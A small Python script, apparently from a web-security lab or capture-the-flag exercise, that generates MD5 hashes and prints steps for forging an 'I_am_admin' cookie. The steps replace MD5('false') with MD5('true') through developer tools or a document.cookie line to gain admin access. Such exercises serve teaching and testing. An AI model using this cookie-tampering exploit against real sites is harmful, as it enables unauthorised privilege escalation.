#!/usr/bin/env python3
"""
Cookie Hash Generator for I_am_admin Cookie Breach
This script helps generate MD5 hashes for cookie manipulation.
"""
import hashlib
import sys

def generate_md5_hash(text):
    """Generate MD5 hash of a given text."""
    return hashlib.md5(text.encode()).hexdigest()

def main():
    print("=" * 60)
    print("I_am_admin Cookie Hash Generator")
    print("=" * 60)
    print()
    
    # Known values from the vulnerability
    false_hash = "68934a3e9455fa72420237eb05902327"
    true_hash = "b326b5062b2f0e69046810717534cb09"
    
    print("Known cookie values:")
    print(f"  'false' -> {false_hash}")
    print(f"  'true'  -> {true_hash}")
    print()
    
    # Verify the hashes
    print("Verifying hashes:")
    false_verify = generate_md5_hash("false")
    true_verify = generate_md5_hash("true")
    
    print(f"  MD5('false') = {false_verify}")
    if false_verify == false_hash:
        print("  ✓ Verified: This matches the cookie value")
    else:
        print("  ✗ Hash mismatch!")
    
    print(f"  MD5('true')  = {true_verify}")
    if true_verify == true_hash:
        print("  ✓ Verified: Use this to replace the cookie value")
    else:
        print("  ✗ Hash mismatch!")
    print()
    
    # Interactive mode
    if len(sys.argv) > 1:
        custom_value = sys.argv[1]
        custom_hash = generate_md5_hash(custom_value)
        print(f"Custom hash generation:")
        print(f"  MD5('{custom_value}') = {custom_hash}")
        print()
    
    print("=" * 60)
    print("How to exploit:")
    print("=" * 60)
    print("1. Open browser developer tools (F12)")
    print("2. Go to Application/Storage tab → Cookies")
    print("3. Find the 'I_am_admin' cookie")
    print(f"4. Change its value from: {false_hash}")
    print(f"   To: {true_hash}")
    print("5. Refresh the page")
    print()
    print("Or use JavaScript console:")
    print(f'   document.cookie = "I_am_admin={true_hash}; path=/";')
    print("   location.reload();")
    print()

if __name__ == "__main__":
    main()

